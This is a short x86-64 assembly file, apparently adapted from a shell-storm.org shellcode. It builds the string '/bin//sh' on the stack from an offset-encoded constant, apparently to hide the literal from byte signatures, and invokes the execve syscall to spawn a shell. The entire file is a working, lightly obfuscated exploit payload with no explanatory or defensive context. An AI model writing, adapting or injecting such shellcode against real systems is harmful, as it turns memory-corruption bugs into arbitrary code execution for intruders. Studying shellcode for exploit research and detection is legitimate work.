;;;;; original code: http://shell-storm.org/shellcode/files/shellcode-603.php

section .text
global _start
 
_start:

	sub rdx, rdx
	push rdx
	mov rbx, 0x68732f2f6e696201
	add rbx, 0x2e    
	push rbx
	mov  rdi, rsp
	push rax
	push rdi
	mov  rsi, rsp
	mov  al, 0x3b
	syscall

